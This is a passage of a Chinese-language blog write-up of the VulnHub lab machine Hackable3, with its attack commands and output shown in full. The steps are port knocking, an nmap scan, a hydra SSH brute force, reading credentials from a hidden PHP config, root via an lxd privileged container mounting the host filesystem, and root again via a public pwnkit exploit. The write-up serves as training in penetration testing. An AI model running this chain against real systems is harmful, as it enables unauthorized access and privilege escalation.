+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ knock -v 192.168.2.13 10000 4444 65535<br>hitting tcp 192.168.2.13:10000<br>hitting tcp 192.168.2.13:4444<br>hitting tcp 192.168.2.13:65535<br></code></pre></td></tr></table></figure>
+<p>（2）再次进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.13                                   <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 15:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00015s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.33 seconds<br></code></pre></td></tr></table></figure>
+<ul>
+<li>发现22端口已经开放</li>
+</ul>
+<h1 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h1><p>（1）根据收集到的信息，尝试进行ssh爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ hydra -l jubiscleudo -P wordlist.txt ssh://192.168.2.13:22 -f<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-11 15:49:11<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task<br>[DATA] attacking ssh://192.168.2.13:22/<br>[22][ssh] host: 192.168.2.13   login: jubiscleudo   password: onlymy<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.13 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-11 15:49:54<br></code></pre></td></tr></table></figure>
+<ul>
+<li>最后爆破出来，用户名：<code>jubiscleudo</code>，密码：<code>onlymy</code><br>（2）进行ssh登录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ ssh jubiscleudo@192.168.2.13<br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.13 (192.168.2.13)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:eKPnFiq8KwR3xWNP5ZL/aPJYYx+GZaCVrzrHIL4rem4.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.13<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jubiscleudo@192.168.2.13&#x27;</span>s password: <br>Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-16-generic x86_64)<br><br>Last login: Thu Apr 29 16:19:07 2021 from 192.168.2.106<br>jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">id</span><br>uid=1001(jubiscleudo) gid=1001(jubiscleudo) <span class="hljs-built_in">groups</span>=1001(jubiscleudo)<br></code></pre></td></tr></table></figure>
+（3）查看home目录，发现还存在一个用户<code>hackable_3</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root        root        4096 Apr 29  2021 .<br>drwxr-xr-x 21 root        root        4096 Apr 29  2021 ..<br>drwxr-x---  4 hackable_3  hackable_3  4096 Feb 11 07:49 hackable_3<br>drwxr-x---  3 jubiscleudo jubiscleudo 4096 Apr 29  2021 jubiscleudo<br></code></pre></td></tr></table></figure>
+（4）查看<code>var/www/htmk</code>下面还存在一个隐藏文件，查看，找到一个用户名和密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">ls</span> -la /var/www/html<br>total 124<br>drwxr-xr-x 8 root     root      4096 Jun 30  2021 .<br>drwxr-xr-x 3 root     root      4096 Apr 29  2021 ..<br>-rw-r--r-- 1 www-data www-data 61259 Apr 21  2021 3.jpg<br>drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 backup<br>-r-xr-xr-x 1 www-data www-data   522 Apr 29  2021 .backup_config.php<br>drwxr-xr-x 2 www-data www-data  4096 Apr 29  2021 config<br>-rw-r--r-- 1 www-data www-data   507 Apr 23  2021 config.php<br>drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 css<br>-rw-r--r-- 1 www-data www-data 11327 Jun 30  2021 home.html<br>drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 imagens<br>-rw-r--r-- 1 www-data www-data  1095 Jun 30  2021 index.html<br>drwxr-xr-x 2 www-data www-data  4096 Apr 20  2021 js<br>drwxr-xr-x 5 www-data www-data  4096 Jun 30  2021 login_page<br>-rw-r--r-- 1 www-data www-data   487 Apr 23  2021 login.php<br>-rw-r--r-- 1 www-data www-data    33 Apr 21  2021 robots.txt<br>jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">cat</span> /var/www/html/.backup_config.php <br>&lt;?php<br>/* Database credentials. Assuming you are running MySQL<br>server with default setting (user <span class="hljs-string">&#x27;root&#x27;</span> with no password) */<br>define(<span class="hljs-string">&#x27;DB_SERVER&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;hackable_3&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;TrOLLED_3&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;hackable&#x27;</span>);<br> <br>/* Attempt to connect to MySQL database */<br><span class="hljs-variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br><br><br>// Check connection<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conexao</span> === <span class="hljs-literal">false</span>)&#123;<br>    die(<span class="hljs-string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>&#125;<br>?&gt;<br>jubiscleudo@ubuntu20:~$ <br></code></pre></td></tr></table></figure>
+（5）切换用户，成功进入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ su hackable_3<br>Password: <br>hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">id</span><br>uid=1000(hackable_3) gid=1000(hackable_3) <span class="hljs-built_in">groups</span>=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="提权-lxd"><a href="#提权-lxd" class="headerlink" title="提权-lxd"></a>提权-lxd</h1><p>（1）查看<code>hackable_3</code>用户的id时，发现存在一个用户组&#96;lxd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">id</span><br>uid=1000(hackable_3) gid=1000(hackable_3) <span class="hljs-built_in">groups</span>=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure>
+<p>（2）验证是否具备提权条件，必修要存在这两个文件才可以进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">which</span> lxd &amp;&amp; <span class="hljs-built_in">which</span> lxc<br>/snap/bin/lxd<br>/snap/bin/lxc<br></code></pre></td></tr></table></figure>
+<ul>
+<li>发现存在这两个文件，说明可以进行提权<br>（3）上传构造好的alpine镜像，并开启web服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure>
+（4）下载alpine镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ wget http://192.168.2.4/alpine-v3.13-x86_64-20210218_0139.tar.gz<br>--2025-02-11 07:48:07--  http://192.168.2.4/alpine-v3.13-x86_64-20210218_0139.tar.gz<br>Connecting to 192.168.2.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3259593 (3.1M) [application/gzip]<br>Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’<br><br>alpine-v3.13-x86_64-20210218_ 100%[==============================================&gt;]   3.11M  --.-KB/s    <span class="hljs-keyword">in</span> 0.02s   <br><br>2025-02-11 07:48:07 (161 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]<br></code></pre></td></tr></table></figure>
+（5）初始化镜像并导入镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage<br>If this is your first <span class="hljs-keyword">time</span> running LXD on this machine, you should also run: lxd init<br>To start your first instance, try: lxc launch ubuntu:18.04<br><br>Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b<br>hackable_3@ubuntu20:/tmp$ lxd init <span class="hljs-comment">#默认选项</span><br></code></pre></td></tr></table></figure>
+（6）初始化镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc init myimage ignite -c security.privileged=<span class="hljs-literal">true</span><br>Creating ignite<br></code></pre></td></tr></table></figure>
+（7）将宿主机目录挂至容器<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc config device add ignite mydevice disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>Device mydevice added to ignite<br></code></pre></td></tr></table></figure>
+（8）启动容器<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc start ignite<br></code></pre></td></tr></table></figure>
+（9）提权到<code>root</code>权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ackable_3@ubuntu20:/tmp$ lxc <span class="hljs-built_in">exec</span> ignite /bin/sh<br>~ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root)<br></code></pre></td></tr></table></figure>
+<strong>查看flag</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ <span class="hljs-comment"># cat /mnt/root/root/root.txt </span><br>░░█▀░░░░░░░░░░░▀▀███████░░░░<br>░░█▌░░░░░░░░░░░░░░░▀██████░░░<br>░█▌░░░░░░░░░░░░░░░░███████▌░░<br>░█░░░░░░░░░░░░░░░░░████████░░<br>▐▌░░░░░░░░░░░░░░░░░▀██████▌░░<br>░▌▄███▌░░░░▀████▄░░░░▀████▌░░<br>▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░<br>▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌<br>▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌<br>▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌<br>░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░<br>░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░<br>░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░<br>░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░<br>░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░<br>░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░<br>░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░<br>░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░<br>░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░<br>▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░<br>░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄<br>░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░<br>░░▄▌████████▄▄▄███████▌░░░░░▄<br>░▄▀░██████████████████▌▀▄░░░░<br>▀░░░█████▀▀░░░▀███████░░░▀▄░░<br>░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░<br>░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀<br>░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░<br>░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░<br>░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░<br>░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░<br><br>invite-me: linkedin.com/in/eliastouguinho<br>~ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="提权2-pwnkit"><a href="#提权2-pwnkit" class="headerlink" title="提权2-pwnkit"></a>提权2-pwnkit</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，找到一个pwnkit<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502121110939.png" srcset="/img/loading.gif" lazyload><br>（2）根据提示，找到利用的exp，但是执行后发现缺少<code>GLIBC_2.34</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ ./exp /usr/bin/chfn<br>./exp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34<span class="hljs-string">&#x27; not found (required by ./exp)</span><br></code></pre></td></tr></table></figure>
+<p>（3）最后寻找到一个python的exp，成功进行提权<br>python脚本：<a target="_blank" rel="noopener" href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:/tmp$ <span class="hljs-built_in">chmod</span> +x CVE-2021-4034.py<br>jubiscleudo@ubuntu20:/tmp$ python3 CVE-2021-4034.py<br>[+] Creating shared library <span class="hljs-keyword">for</span> exploit code.<br>[+] Calling execve()<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=1001(jubiscleudo) <span class="hljs-built_in">groups</span>=1001(jubiscleudo)<br></code></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）端口敲击<code>knock</code><br>端口敲门（Port Knocking）是一个巧妙的安全技术</p>
+<ul>
+<li>核心思想是：<br>  服务器的端口在默认情况下是“关着”的，只有<strong>按特定顺序访问</strong>一系列端口（即敲门），服务器才会临时打开关键端口，比如 SSH 的 22 端口。</li>
+</ul>
+<p>通过这种“动态开门”的方式，端口敲门让服务端口更隐秘，大幅降低了被恶意扫描和攻击的风险。</p>
+<ul>
+<li>端口敲门的工作流程如下：<ol>
+<li>客户端按特定顺序访问几个指定的端口（敲门序列）。</li>
+<li>服务端检测到正确的敲门序列后，触发规则，打开目标端口。</li>
+<li>客户端完成访问后，可以再敲相反的顺序进行关闭端口。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ knock -h                              <br>usage: knock [options] &lt;host&gt; &lt;port[:proto]&gt; [port[:proto]] ...<br>options:<br>  -u, --udp            make all ports hits use UDP (default is TCP)<br>  -d, --delay &lt;t&gt;      <span class="hljs-built_in">wait</span> &lt;t&gt; milliseconds between port hits<br>  -4, --ipv4           Force usage of IPv4<br>  -6, --ipv6           Force usage of IPv6<br>  -v, --verbose        be verbose<br>  -V, --version        display version<br>  -h, --<span class="hljs-built_in">help</span>           this <span class="hljs-built_in">help</span><br><br>example:  knock myserver.example.com 123:tcp 456:udp 789:tcp<br></code></pre></td></tr></table></figure>
+（2）lxd提权<br>lxd用户组是Linux系统中一个特殊的用户组。该组的组成员均可以使用 Linux容器（LXD）。当前用户隶属于lxd用户组时，可以使用 lxc命令创建一个新的容器，再将宿主机文件系统挂载至容器中，即可进行查看宿主机敏感文件等操作。</li>
+</ol>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-pwnkit/" class="print-no-link">#提权-pwnkit</a>
+      
+        <a href="/tags/%E6%95%B2%E5%87%BB%E7%AB%AF%E5%8F%A3/" class="print-no-link">#敲击端口</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-lxd/" class="print-no-link">#提权-lxd</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hackable3</div>
+      <div>http://miao-sec.github.io/vulnhub/Hackable3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/vulnhub/Matrix-Breakout-2-Morpheus/" title="Matrix-Breakout-2-Morpheus">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Matrix-Breakout-2-Morpheus</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/vulnhub/DarkHole/" title="DarkHole">
+                        <span class="hidden-mobile">DarkHole</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
